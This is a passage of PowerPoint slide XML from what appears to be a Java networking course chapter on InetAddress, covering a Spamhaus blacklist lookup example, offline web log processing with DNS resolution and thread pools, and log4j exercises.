            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3733800" y="38100"/>
            <a:ext cx="3929281" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Full </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SpamCheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>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xfrm>
            <a:off x="1825625" y="228600"/>
            <a:ext cx="8540750" cy="457200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>Application of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>InetAddress : SpamCheck</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="65539"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17475" y="801687"/>
            <a:ext cx="10287000" cy="581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8915400" y="2819400"/>
            <a:ext cx="2971800" cy="2308324"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Demonstration </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Run the sample program ch4.SpamCheck.java to sbl.spamhaus.org to ask some IP address (such as 207.34.56.23 , etc.) whether it is a spammer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>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内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="935039"/>
            <a:ext cx="11675268" cy="914400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Application Question: How to improve the performance of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>server by quickly processing log files offline?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6656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29200" y="2233186"/>
            <a:ext cx="1217613"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564" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="228600"/>
            <a:ext cx="11887200" cy="457200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>Application of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>InetAddress : Offline processing of log files</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66565" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2819400" y="2247900"/>
            <a:ext cx="1905000" cy="19050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Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800"/>
              <a:t>Server</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66566" name="流程图: 文档 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2971800" y="3200400"/>
            <a:ext cx="685800" cy="838200"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartDocument">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF0066"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:rou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log</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="椭圆形标注 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1612900" y="4495800"/>
            <a:ext cx="3111500" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeEllipseCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 1150"/>
              <a:gd name="adj2" fmla="val -92074"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2">
              <a:lumMod val="20000"/>
              <a:lumOff val="80000"/>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GB" altLang="en-US" sz="1200" dirty="0"/>
              <a:t>Track and record hosts that access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1200" dirty="0"/>
              <a:t>Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1200" dirty="0"/>
              <a:t>sites and report </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1200" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1200" dirty="0"/>
              <a:t>addresses of the hosts that access the site</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66568" name="TextBox 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6705601" y="2155632"/>
            <a:ext cx="53340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When analyzing logs, you need to convert </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>the IP address of the visiting host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>into a host name. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>For example, to perform simple log analysis: read the log file and convert </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>address into a host name when displaying each line.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>How to programmatically handle it?</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66569" name="TextBox 7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5534334" y="4407482"/>
            <a:ext cx="6019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solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Demonstration run example </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ch4.Weblog.java, ex4-10</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Analyze the class structure of the program</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66570" name="TextBox 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="990600" y="6000890"/>
            <a:ext cx="9055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solidFill>
                  <a:srgbClr val="FF0066"/>
                </a:solidFill>
              </a:rPr>
              <a:t>There are a lot of log entries, millions of lines. What are the drawbacks of the program? How to improve the program design and improve performance.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0066"/>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33400" y="34925"/>
            <a:ext cx="10439400" cy="678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10. Offline Log Processing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="2076451"/>
            <a:ext cx="11387667" cy="3352800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>•	Batch-resolve IPs in log files with cached DNS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>•	Handle failures gracefully (e.g., fallback to IPs).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>•	Students can process large logs efficiently (e.g., Apache/Nginx log analyzers).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"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内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1746676"/>
            <a:ext cx="11049000" cy="1783497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>Use multiple threads? Spawn a processing thread for each log entry? Bring down the server!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>Using thread pool</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68611" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295400" y="469047"/>
            <a:ext cx="8540750" cy="838200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>W</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>eb </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>erver log files</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68612" name="TextBox 7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="581025" y="3969603"/>
            <a:ext cx="107283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400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0066"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Examples: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0066"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ch4.LookupTask.java, PooledWeblog.java, ex4-11, ex4-12</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0066"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0066"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Analyze the class structure of the program</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0066"/>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33400" y="304800"/>
            <a:ext cx="106680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4800" y="457200"/>
            <a:ext cx="110490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4800" y="304800"/>
            <a:ext cx="111252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内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="495300" y="1581150"/>
            <a:ext cx="11201400" cy="3695700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>What are the design disadvantages of using a thread pool to handle server logging?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>If you were asked to program a log file on a server, how would you design the program? You need to consider the fast writing of log entries, the fast reading and analysis, and the large amount of memory occupied by opening thousands or even millions of log files. Try to write a log processing service program.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72707" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1825625" y="228600"/>
            <a:ext cx="8540750" cy="838200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>Programming Thinking </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600"/>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="2057400"/>
            <a:ext cx="11353800" cy="1943100"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>Try to use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>log4j open source plug-in to implement the Web server logging function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>through programming , mainly to achieve the formatted and directional output storage of log information (in the log file).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73731" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1825625" y="228600"/>
            <a:ext cx="8540750" cy="838200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>Programming Thinking </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600"/>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="360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166" y="1429509"/>
            <a:ext cx="11387667" cy="4498975"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Teaching Objective</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Combine concepts into real-world projects (e.g., network scanner, DNS cache monitor).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Debug common issues (stale cache, mismatched DNS).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Capstone Project</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Build a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Java-based network utility</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> that:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Resolves hostnames,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Validates IP properties,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Detects anomalies (e.g., spoofed reverse DNS).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{65370F98-A69C-4A31-93A8-A7513EEFDFA8}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402167" y="404882"/>
            <a:ext cx="11387667" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>11. Programming Practice &amp; Critical Thinking</a:t>
            </a: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2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1524001" y="21299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74755" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7467600" y="4953000"/>
            <a:ext cx="36703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buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="8000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Thanks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="8000" b="1" dirty="0">
              <a:solidFill>
